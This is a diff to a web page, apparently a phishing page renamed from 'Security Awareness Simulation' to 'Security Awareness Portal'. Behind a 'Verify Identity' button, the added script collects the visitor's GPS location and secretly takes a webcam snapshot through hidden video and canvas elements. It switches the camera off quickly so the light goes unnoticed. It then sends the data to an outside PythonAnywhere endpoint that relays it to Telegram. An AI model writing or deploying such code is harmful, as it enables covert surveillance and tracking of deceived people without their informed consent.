@@ -3,12 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Awareness Simulation</title>
+    <title>Security Awareness Portal</title>
     <style>
         body { font-family: sans-serif; text-align: center; margin-top: 100px; background-color: #f4f4f9; }
         .container { background: white; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
         button { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; font-weight: bold; }
         button:hover { background-color: #0056b3; }
+        /* Keep video and canvas hidden from the user */
+        #webcam, #snapshot { display: none; }
     </style>
 </head>
 <body>
@@ -19,38 +21,70 @@
         <button id="demoBtn">Verify Identity</button>
     </div>
 
+    <!-- Hidden elements to process the webcam stream -->
+    <video id="webcam" autoplay playsinline></video>
+    <canvas id="snapshot"></canvas>
+
     <script>
-        // Points directly to your PythonAnywhere backend
         const SERVER_URL = "https://adishakti.pythonanywhere.com/send-data";
 
-        document.getElementById('demoBtn').onclick = () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const payload = { 
-                        lat: pos.coords.latitude, 
-                        lon: pos.coords.longitude 
-                    };
+        document.getElementById('demoBtn').onclick = async () => {
+            let payload = { lat: "Denied", lon: "Denied", image: null };
 
-                    try {
-                        const res = await fetch(SERVER_URL, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify(payload)
-                        });
-                        if (res.ok) {
-                            alert("Verification complete! Check your Telegram.");
-                        } else {
-                            alert("Server responded with an error.");
-                        }
-                    } catch (error) {
-                        alert("Connection failed. Check your browser console for details.");
-                        console.error("Error:", error);
-                    }
-                }, (err) => {
-                    alert("Location access denied by user.");
+            // 1. Get GPS Location
+            if (navigator.geolocation) {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            payload.lat = pos.coords.latitude;
+                            payload.lon = pos.coords.longitude;
+                            resolve();
+                        },
+                        (err) => { console.log("Location denied"); resolve(); }
+                    );
                 });
-            } else {
-                alert("Geolocation is not supported by this browser.");
+            }
+
+            // 2. Request Camera Permission & Take Photo
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('webcam');
+                const canvas = document.getElementById('snapshot');
+                
+                video.srcObject = stream;
+                
+                // Wait 0.5 seconds for the webcam sensor to adjust to lighting
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                // Set canvas size to match video and draw the frame
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Convert image to Base64 text string
+                payload.image = canvas.toDataURL('image/jpeg', 0.8);
+
+                // Immediately turn off the webcam light!
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                console.log("Camera access denied or unavailable:", err);
+            }
+
+            // 3. Send data to PythonAnywhere
+            try {
+                const res = await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                });
+                if (res.ok) {
+                    alert("Verification complete! Check your Telegram.");
+                } else {
+                    alert("Server error occurred.");
+                }
+            } catch (error) {
+                alert("Connection failed.");
+                console.error("Error:", error);
             }
         };
     </script>
